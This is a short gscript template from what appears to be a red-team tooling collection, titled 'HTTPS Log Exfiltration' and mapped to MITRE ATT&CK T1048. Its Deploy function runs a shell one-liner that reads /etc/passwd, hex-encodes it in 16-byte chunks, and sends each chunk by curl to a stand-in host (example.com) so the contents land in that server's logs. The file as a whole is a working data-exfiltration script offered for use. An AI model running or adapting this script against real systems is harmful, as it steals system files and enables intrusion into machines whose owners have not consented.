// Example gscript template
// Title: HTTPS Log Exfiltration
// Author: ahhh
// Purpose: read a file, base64 encode it, send chunks to webserver to be caught in logs
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1048

//priority:90
//timeout:150
//import:/private/tmp/example.macho

var url = "https://example.com/";
var target_file = "/etc/passwd";

function BeforeDeploy() {
  LogInfo("starting HTTPS Log Exfiltration");
  return true; 
}

function Deploy() {

  // Ghetto exfil the target
  var target_url = url+"$i";
  var command = "/bin/cat "+target_file+" | xxd -ps -c 16 | while read i; do curl "+target_url+"; done;";
  var response = ExecuteCommand("sh", ["-c", command]);
  LogInfo(response.retObject.Stderr);
  LogInfo(response.retObject.Stdout);
  return true;

}

function AfterDeploy() {
  LogInfo("done, HTTPS Log Exfiltration");
  return true;
}